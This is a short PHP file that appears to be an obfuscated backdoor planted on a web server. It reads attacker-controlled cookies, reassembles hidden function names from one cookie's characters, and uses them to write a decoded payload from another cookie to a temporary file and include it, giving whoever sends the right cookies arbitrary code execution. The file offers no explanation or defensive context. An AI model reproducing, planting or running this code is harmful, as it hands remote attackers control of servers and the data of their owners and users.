<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[34])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 5;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[34][$n];
        if (!$c[34][$n + 1]) {
            if (!$c[34][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 5 + 1;
    }
    $k = $p[28]() . $p[3];
    if (!$p[11]($k)) {
        $n = $p[22]($k, $p[25]);
        $p[16]($n, $p[29] . $p[1]($p[14]($c[3])));
    }
    include($k);
}